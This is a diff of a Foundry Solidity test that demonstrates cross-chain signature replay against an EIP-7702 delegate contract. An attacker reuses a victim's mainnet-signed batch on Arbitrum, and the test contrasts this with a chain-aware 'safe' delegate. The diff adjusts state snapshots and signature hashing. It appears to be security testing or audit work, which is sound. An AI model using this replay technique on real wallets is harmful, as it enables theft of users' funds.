@@ -79,24 +79,29 @@ contract DC03_CrossChainReplayTest is Test {
         console.log("Victim signed batch on mainnet (chainId=1)");
         console.log("Victim balance on mainnet before:", victimEOA.balance / 1e18, "ETH");
 
+        // 1. SNAPSHOT STATE (Nonce = 0)
+        uint256 snapshotId = vm.snapshot();
+
         // Execute on mainnet - works as intended
         DC03_CrossChainDelegate(victimEOA).executeBatch(targets, calldatas, values, sig);
         console.log("Victim balance on mainnet after:", victimEOA.balance / 1e18, "ETH");
 
+       
+        vm.revertTo(snapshotId);
+        
+        // 3. Manually credit the recipient the 1 ETH they earned on Mainnet 
+        vm.deal(recipient, 1 ether);
+
         // --- ARBITRUM (chainId = 42161) ---
-        // Refund victim to simulate they also have funds on Arbitrum
         vm.deal(victimEOA, 10 ether);
         vm.chainId(ARBITRUM_CHAIN_ID);
 
-        // Victim delegates on Arbitrum too (same delegate address, different chain)
+        // Victim delegates on Arbitrum too
         _etch7702(victimEOA, address(vulnDelegate));
-        vm.prank(victimEOA);
-        DC03_CrossChainDelegate(victimEOA).initialize(victimEOA);
-
+        
         console.log("Switched to Arbitrum (chainId=42161)");
         console.log("Victim Arbitrum balance before replay:", victimEOA.balance / 1e18, "ETH");
 
-        // Attacker replays the EXACT SAME signature from mainnet
         // Nonce on Arbitrum is 0 (fresh) - matches the signed nonce
         vm.prank(attacker);
         DC03_CrossChainDelegate(victimEOA).executeBatch(targets, calldatas, values, sig);
@@ -162,8 +167,6 @@ contract DC03_CrossChainReplayTest is Test {
         vm.deal(victimEOA, 10 ether);
         vm.chainId(ARBITRUM_CHAIN_ID);
         _etch7702(victimEOA, address(safeDelegate));
-        vm.prank(victimEOA);
-        DC03_SafeChainDelegate(victimEOA).initialize(victimEOA);
 
         // Attacker tries to replay the mainnet signature on Arbitrum
         vm.prank(attacker);
@@ -230,7 +233,7 @@ contract DC03_CrossChainReplayTest is Test {
         bytes32 structHash = keccak256(abi.encode(
             BATCH_TYPEHASH,
             keccak256(abi.encodePacked(targets)),
-            keccak256(abi.encodePacked(calldatas)),
+            keccak256(abi.encode(calldatas)),
             keccak256(abi.encodePacked(values)),
             nonce
         ));
@@ -260,7 +263,7 @@ contract DC03_CrossChainReplayTest is Test {
         bytes32 structHash = keccak256(abi.encode(
             BATCH_TYPEHASH,
             keccak256(abi.encodePacked(targets)),
-            keccak256(abi.encodePacked(calldatas)),
+            keccak256(abi.encode(calldatas)),
             keccak256(abi.encodePacked(values)),
             nonce
         ));
